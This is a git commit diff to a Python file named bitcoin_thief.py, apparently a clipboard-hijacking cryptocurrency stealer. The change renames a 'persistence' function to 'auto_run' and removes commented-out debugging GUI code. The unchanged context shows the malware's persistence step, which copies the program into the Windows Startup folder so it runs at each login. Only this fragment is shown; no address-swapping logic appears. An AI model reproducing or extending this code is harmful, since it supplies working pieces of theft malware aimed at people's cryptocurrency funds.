c13d387c1274d58f85897186d9bbbff032efbd95
00dc <59871400+00dc@users.noreply.github.com>
2020-01-14 22:37:19 +1100

    Update bitcoin_thief.py

--- bitcoin_thief.py
+++ bitcoin_thief.py
@@ -11,22 +11,12 @@ import pyperclip, re, os, shutil, sys
 # PyperClip documentation: https://pypi.org/project/pyperclip/
 
 
-def persistence():
+def auto_run():
 
     current_location = sys.argv[0]
     application_name = os.path.basename(current_location)
     startup_folder = os.path.join(os.environ['USERPROFILE'],'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
     target_location = os.path.join(startup_folder,application_name)
-
-    # root = Tk()
-    # root.minsize(width=400, height=320)
-    # root.maxsize(width=800, height=320)
-    # root.configure(background='LightSkyBlue1')
-    # Label(root, text=sys.argv[0], fg='blue', bg='LightSkyBlue1', font='Roboto 9 bold').pack()
-    # Label(root, text=application_name, fg='blue', bg='LightSkyBlue1', font='Roboto 9 bold').pack()
-    # Label(root, text=startup_folder, fg='blue', bg='LightSkyBlue1', font='Roboto 9 bold').pack()
-    # Label(root, text=target_location, fg='blue', bg='LightSkyBlue1', font='Roboto 9 bold').pack()
-    # root.mainloop()
 
     if not os.path.exists(target_location):
 
